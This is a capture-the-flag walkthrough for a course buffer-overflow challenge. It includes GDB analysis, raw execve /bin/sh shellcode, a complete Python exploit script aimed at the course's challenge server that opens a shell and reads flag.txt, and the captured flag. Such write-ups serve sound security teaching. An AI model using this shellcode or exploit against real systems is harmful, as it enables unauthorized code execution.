# Basic Shellcode Challenge Walkthrough

**Challenge:** Exploit a buffer overflow to inject and execute shellcode
**Server:** moa6.eecs.utk.edu:6022
**Flag:** `cosc466-flag-{auCe5uaQCQxuqn}`

## Overview

This challenge involves:
- Stack-based buffer overflow vulnerability
- Executable stack (NX disabled)
- Address leak
- Shellcode injection

## Step 1: Reconnaissance

Check the binary properties:
```bash
file shellcode
# Output: ELF 32-bit LSB executable, Intel 80386, statically linked, not stripped

# Check security mitigations
readelf -l shellcode | grep -E "GNU_STACK|Type"
# Output: GNU_STACK ... RWE (Read-Write-Execute - stack is executable!)
```

**Key findings:**
- 32-bit x86 binary
- Stack is executable (RWE) - perfect for shellcode!
- Not stripped - easier to debug

## Step 2: Observe Program Behavior

Run the binary to see what it does:
```bash
echo "test input" | ./shellcode
# Output: Welcome 0xff8ed19c test input
```

**Important:** The program leaks a memory address (`0xff8ed19c`) - this is the buffer address!

## Step 3: Analyze with GDB

Launch GDB and examine the vulnerable function:
```bash
gdb shellcode

# Disassemble main
(gdb) disassemble main
```

Main calls `vul_func` at `0x80498c5`. Let's examine it:
```
(gdb) disassemble vul_func
```

**Key observations:**
```asm
0x080498c9: sub    esp,0x20        ; Allocate 32 bytes on stack
0x080498d7: lea    eax,[ebp-0x24]  ; Buffer at ebp-0x24 (36 bytes from ebp)
0x080498db: call   gets            ; VULNERABLE: gets() has no bounds checking!
0x080498e7: lea    eax,[ebp-0x24]  ; Load buffer address
0x080498f2: call   printf          ; Print "Welcome [address] [input]"
```

**Buffer layout:**
```
[36 bytes buffer] [4 bytes saved EBP] [4 bytes return address]
```

## Step 4: Find the Offset

Use pwndbg's cyclic pattern to find exact offset:

```bash
gdb shellcode

# Generate a cyclic pattern
(gdb) cyclic 100

# Set breakpoint after gets()
(gdb) break *0x080498e0

# Run with the pattern
(gdb) run
(gdb) cyclic 100
# Paste the pattern when prompted

# Check what overwrote the return address
(gdb) info frame
# or check EIP/return address

# Find offset of the value that overwrote return address
(gdb) cyclic -l 0x6161616b
# Output: 40
```

**Offset = 40 bytes** to reach the return address!

## Step 5: Check for ASLR

Check if the leaked address is consistent:
```bash
for i in {1..5}; do echo "test" | nc moa6.eecs.utk.edu 6022; done
```

**Result:** All addresses are `0xffffdbbc` - ASLR is disabled!

## Step 6: Craft the Exploit

The attack strategy:
1. Place shellcode at the **start** of buffer
2. Pad to 40 bytes
3. Overwrite return address with buffer address (`0xffffdbbc`)
4. When function returns, execution jumps to our shellcode!

**Shellcode used:**
```python
# execve("/bin/sh", NULL, NULL)
SHELLCODE = b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80"
# Length: 25 bytes
```

**Payload structure:**
```
[25 bytes shellcode] + [15 bytes padding] + [4 bytes: 0xffffdbbc]
                                                       ^
                                                       |
                                              Return jumps here!
```

## Step 7: Write the Exploit

```python
#!/usr/bin/env python3
import socket
import struct
import subprocess

HOST = "moa6.eecs.utk.edu"
PORT = 6022
OFFSET = 40
SHELLCODE = b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80"
TARGET_ADDR = 0xffffdbbc

def main() -> None:
    # Build payload: shellcode + padding + return address
    padding = b"A" * (OFFSET - len(SHELLCODE))
    payload = SHELLCODE + padding + struct.pack("<I", TARGET_ADDR) + b"\n"
    
    with socket.create_connection((HOST, PORT), timeout=5) as sock:
        sock.sendall(payload)
        # Send commands to the spawned shell
        sock.sendall(b"cat flag.txt\n")
        sock.sendall(b"ls\n")
        sock.sendall(b"exit\n")
        
        # Receive output
        chunks = []
        while True:
            try:
                data = sock.recv(4096)
            except socket.timeout:
                break
            if not data:
                break
            chunks.append(data)
        
        output = b"".join(chunks).decode()
        print(output)

if __name__ == "__main__":
    main()
```

## Step 8: Execute and Get Flag

Run the exploit:
```bash
python3 exploit.py
```

**Output:**
```
cosc466-flag-{auCe5uaQCQxuqn}
flag.txt
shellcode
/home/cosc466
```

## Key Concepts

### Why This Works:
1. **Executable Stack** - The stack has RWE permissions, allowing code execution
2. **No ASLR** - Buffer address is predictable (`0xffffdbbc`)
3. **Buffer Overflow** - `gets()` allows unlimited input
4. **Return Address Overwrite** - We redirect execution to our buffer

### Attack Flow:
```
1. Send payload: [shellcode][padding][buffer_addr]
2. gets() writes to buffer, overflows into return address
3. vul_func returns
4. Instead of returning to main, jumps to 0xffffdbbc (our buffer)
5. Shellcode executes, spawns /bin/sh
6. We send commands to the shell
7. Flag retrieved!
```

## Common Issues

**Q: Why do we need to send commands after the payload?**
A: The shellcode spawns /bin/sh, but without stdin, it would immediately exit. We send commands like `cat flag.txt` to interact with the shell.

**Q: What if ASLR was enabled?**
A: We'd need to leverage the address leak in the program output. Parse the leaked address and use it dynamically in the exploit.

**Q: Why 40 bytes offset, not 36?**
A: The buffer is 36 bytes (0x24), but we need to overwrite the saved EBP (4 bytes) to reach the return address. So: 36 (buffer) + 4 (saved EBP) = 40 bytes.

## Practice Exercise

Try solving this locally:
1. Set `LOCAL_BINARY = "./shellcode"` in exploit.py
2. Run: `python3 exploit.py`
3. Note: Local addresses will differ, you'll need to parse the leaked address

## Resources

- [Shellcode Database](http://shell-storm.org/shellcode/)
- [pwntools Documentation](https://docs.pwntools.com/en/stable/)
- [GDB Pwndbg](https://github.com/pwndbg/pwndbg)
